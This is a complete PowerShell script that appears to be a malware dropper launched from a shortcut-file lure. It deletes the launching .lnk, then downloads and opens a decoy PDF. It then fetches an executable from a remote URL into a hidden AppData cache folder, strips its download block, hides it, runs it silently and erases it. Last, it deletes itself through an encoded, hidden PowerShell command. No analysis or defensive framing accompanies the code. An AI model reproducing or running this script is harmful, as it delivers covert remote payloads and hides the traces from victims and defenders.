# Function to force delete files
function Force-FileDelete {
    param([string]$Path)
    if ([System.IO.File]::Exists($Path)) {
        try {
            attrib -r -h -s $Path -ErrorAction SilentlyContinue
            [System.IO.File]::Delete($Path)
        } catch {}
    }
}

# Function to run PowerShell in hidden window
function Invoke-HiddenPowerShell {
    param([string]$ScriptBlock)
    $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ScriptBlock))
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encoded" -WindowStyle Hidden -ErrorAction SilentlyContinue
}

# Enhanced function to open PDF with maximum fallbacks
function Open-PDF {
    param([string]$PdfPath)
    
    if (-not (Test-Path $PdfPath)) {
        Write-Host "PDF file does not exist: $PdfPath" -ForegroundColor Red
        return
    }
    
    $fileInfo = Get-Item $PdfPath
    if ($fileInfo.Length -eq 0) {
        Write-Host "PDF file is empty" -ForegroundColor Red
        return
    }
    
    Write-Host "Attempting to open PDF: $PdfPath (Size: $($fileInfo.Length) bytes)" -ForegroundColor Green
    
    # Method 1: Start-Process with ShellExecute
    try {
        Start-Process -FilePath $PdfPath -Verb Open -ErrorAction Stop
        Write-Host "Opened with Start-Process -Verb Open" -ForegroundColor Green
        return
    } catch {}
    
    # Method 2: Start-Process default
    try {
        Start-Process -FilePath $PdfPath -ErrorAction Stop
        Write-Host "Opened with Start-Process" -ForegroundColor Green
        return
    } catch {}
    
    # Method 3: Use Shell.Application COM object
    try {
        $shell = New-Object -ComObject Shell.Application
        $shell.ShellExecute($PdfPath)
        Write-Host "Opened with Shell.Application" -ForegroundColor Green
        return
    } catch {}
    
    # Method 4: Use WScript.Shell
    try {
        $wsh = New-Object -ComObject WScript.Shell
        $wsh.Run("`"$PdfPath`"", 1, $false)
        Write-Host "Opened with WScript.Shell" -ForegroundColor Green
        return
    } catch {}
    
    # Method 5: Use Invoke-Item
    try {
        Invoke-Item -Path $PdfPath -ErrorAction Stop
        Write-Host "Opened with Invoke-Item" -ForegroundColor Green
        return
    } catch {}
    
    # Method 6: Find and use default PDF viewer
    try {
        $pdfViewer = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\AcroRd32.exe" -ErrorAction SilentlyContinue).'(default)'
        if ($pdfViewer) {
            Start-Process $pdfViewer -ArgumentList "`"$PdfPath`"" -ErrorAction Stop
            Write-Host "Opened with Acrobat Reader" -ForegroundColor Green
            return
        }
    } catch {}
    
    # Method 7: Try Microsoft Edge
    try {
        $edgePath = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
        if (Test-Path $edgePath) {
            Start-Process $edgePath -ArgumentList "`"$PdfPath`"" -ErrorAction Stop
            Write-Host "Opened with Edge" -ForegroundColor Green
            return
        }
    } catch {}
    
    # Method 8: Try Chrome
    try {
        $chromePaths = @(
            "C:\Program Files\Google\Chrome\Application\chrome.exe",
            "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
            "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe"
        )
        foreach ($chromePath in $chromePaths) {
            if (Test-Path $chromePath) {
                Start-Process $chromePath -ArgumentList "`"$PdfPath`"" -ErrorAction Stop
                Write-Host "Opened with Chrome" -ForegroundColor Green
                return
            }
        }
    } catch {}
    
    # Method 9: Try Firefox
    try {
        $firefoxPaths = @(
            "C:\Program Files\Mozilla Firefox\firefox.exe",
            "C:\Program Files (x86)\Mozilla Firefox\firefox.exe"
        )
        foreach ($firefoxPath in $firefoxPaths) {
            if (Test-Path $firefoxPath) {
                Start-Process $firefoxPath -ArgumentList "`"$PdfPath`"" -ErrorAction Stop
                Write-Host "Opened with Firefox" -ForegroundColor Green
                return
            }
        }
    } catch {}
    
    # Method 10: Use cmd.exe start command
    try {
        Start-Process cmd.exe -ArgumentList "/c start `"`" `"$PdfPath`"" -WindowStyle Hidden -ErrorAction Stop
        Write-Host "Opened with cmd start" -ForegroundColor Green
        return
    } catch {}
    
    # Method 11: Use rundll32 to open with default handler
    try {
        Start-Process rundll32.exe -ArgumentList "url.dll,FileProtocolHandler `"$PdfPath`"" -ErrorAction Stop
        Write-Host "Opened with rundll32" -ForegroundColor Green
        return
    } catch {}
    
    # Method 12: Try PowerShell Start-Process with UseShellExecute
    try {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $PdfPath
        $psi.UseShellExecute = $true
        [System.Diagnostics.Process]::Start($psi) | Out-Null
        Write-Host "Opened with ProcessStartInfo" -ForegroundColor Green
        return
    } catch {}
    
    Write-Host "All methods failed to open PDF" -ForegroundColor Red
}

# Main execution function
function CODE_SEG {
    param(
        [Parameter(Mandatory)][string] $Name,
        [Parameter(Mandatory)][string] $PdfURL,
        [Parameter(Mandatory)][string] $InstallerURL
    )
    
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    
    $CurrentDir = (Get-Location).Path
    $InkPath = Join-Path $CurrentDir ($Name + ".lnk")
    $PdfPath = Join-Path $CurrentDir ($Name + ".pdf")
    
    # DELETE the .lnk file FIRST
    Force-FileDelete -Path $InkPath
    Write-Host "Deleted .lnk file: $InkPath" -ForegroundColor Yellow
    
    # Delete any existing PDF with same name
    Force-FileDelete -Path $PdfPath
    
    # Download PDF with user agent spoofing and retry
    $headers = @{
        "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        "Accept" = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
        "Accept-Language" = "en-US,en;q=0.5"
        "Referer" = "https://www.google.com/"
    }
    
    # Try multiple download methods for PDF
    $pdfDownloaded = $false
    
    # Method 1: Invoke-WebRequest
    try {
        Write-Host "Downloading PDF - Method 1 (Invoke-WebRequest)..." -ForegroundColor Yellow
        Invoke-WebRequest -Uri $PdfURL -OutFile $PdfPath -UseBasicParsing -Headers $headers -ErrorAction Stop
        if ((Get-Item $PdfPath).Length -gt 0) { $pdfDownloaded = $true }
    } catch {}
    
    # Method 2: WebClient
    if (-not $pdfDownloaded) {
        try {
            Write-Host "Downloading PDF - Method 2 (WebClient)..." -ForegroundColor Yellow
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("User-Agent", "Mozilla/5.0")
            $wc.DownloadFile($PdfURL, $PdfPath)
            if ((Get-Item $PdfPath).Length -gt 0) { $pdfDownloaded = $true }
        } catch {}
    }
    
    # Method 3: BITS Transfer
    if (-not $pdfDownloaded) {
        try {
            Write-Host "Downloading PDF - Method 3 (BITS)..." -ForegroundColor Yellow
            Start-BitsTransfer -Source $PdfURL -Destination $PdfPath -ErrorAction Stop
            if ((Get-Item $PdfPath).Length -gt 0) { $pdfDownloaded = $true }
        } catch {}
    }
    
    # Method 4: curl.exe
    if (-not $pdfDownloaded) {
        try {
            Write-Host "Downloading PDF - Method 4 (curl)..." -ForegroundColor Yellow
            & curl.exe -L -o $PdfPath $PdfURL --silent --insecure
            if (Test-Path $PdfPath) {
                if ((Get-Item $PdfPath).Length -gt 0) { $pdfDownloaded = $true }
            }
        } catch {}
    }
    
    # Method 5: System.Net.Http.HttpClient
    if (-not $pdfDownloaded) {
        try {
            Write-Host "Downloading PDF - Method 5 (HttpClient)..." -ForegroundColor Yellow
            $client = New-Object System.Net.Http.HttpClient
            $response = $client.GetAsync($PdfURL).Result
            $content = $response.Content.ReadAsByteArrayAsync().Result
            [System.IO.File]::WriteAllBytes($PdfPath, $content)
            if ($content.Length -gt 0) { $pdfDownloaded = $true }
        } catch {}
    }
    
    # Open the PDF if downloaded
    if ($pdfDownloaded -and (Test-Path $PdfPath)) {
        Write-Host "PDF downloaded successfully: $PdfPath" -ForegroundColor Green
        Write-Host "File size: $((Get-Item $PdfPath).Length) bytes" -ForegroundColor Cyan
        Start-Sleep -Seconds 2
        Open-PDF -PdfPath $PdfPath
    } else {
        Write-Host "PDF download failed" -ForegroundColor Red
    }
    
    # Download EXE with random name to hidden location
    $InstallerURI = [System.Uri] $InstallerURL
    $InstallerExt = [System.IO.Path]::GetExtension($InstallerURI.AbsolutePath)
    if ([string]::IsNullOrEmpty($InstallerExt)) { $InstallerExt = ".exe" }
    $RandomFileName = [System.IO.Path]::GetRandomFileName()
    $RandomFileName = [System.IO.Path]::ChangeExtension($RandomFileName, $InstallerExt)
    
    $InstallerPath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft", "Windows", "Caches", $RandomFileName)
    
    $cacheDir = [System.IO.Path]::GetDirectoryName($InstallerPath)
    if (-not (Test-Path $cacheDir)) {
        New-Item -Path $cacheDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    }
    
    # Download EXE with multiple methods
    $exeDownloaded = $false
    
    # Method 1: Invoke-WebRequest
    try {
        Invoke-WebRequest -Uri $InstallerURL -OutFile $InstallerPath -UseBasicParsing -Headers $headers -ErrorAction Stop
        $exeDownloaded = $true
    } catch {}
    
    # Method 2: WebClient
    if (-not $exeDownloaded) {
        try {
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("User-Agent", "Mozilla/5.0")
            $wc.DownloadFile($InstallerURL, $InstallerPath)
            $exeDownloaded = $true
        } catch {}
    }
    
    # Method 3: BITS Transfer
    if (-not $exeDownloaded) {
        try {
            Start-BitsTransfer -Source $InstallerURL -Destination $InstallerPath -ErrorAction Stop
            $exeDownloaded = $true
        } catch {}
    }
    
    # Method 4: curl.exe
    if (-not $exeDownloaded) {
        try {
            & curl.exe -L -o $InstallerPath $InstallerURL --silent --insecure
            if (Test-Path $InstallerPath) { $exeDownloaded = $true }
        } catch {}
    }
    
    if ($exeDownloaded) {
        Unblock-File -Path $InstallerPath -ErrorAction SilentlyContinue
        attrib +h +s $InstallerPath -ErrorAction SilentlyContinue
        
        # Execute EXE silently
        $Process = (Start-Process -FilePath $InstallerPath -ArgumentList "/silent" -Wait -Passthru -WindowStyle Hidden)
        
        # Clean up
        try {
            attrib -h -s $InstallerPath -ErrorAction SilentlyContinue
            [System.IO.File]::Delete($InstallerPath)
        } catch {}
    }
    
    # Self-delete script
    $scriptPath = $MyInvocation.MyCommand.Path
    if ($scriptPath) {
        Invoke-HiddenPowerShell -ScriptBlock "Start-Sleep -Seconds 5; Remove-Item -Path '$scriptPath' -Force -ErrorAction SilentlyContinue"
    }
}
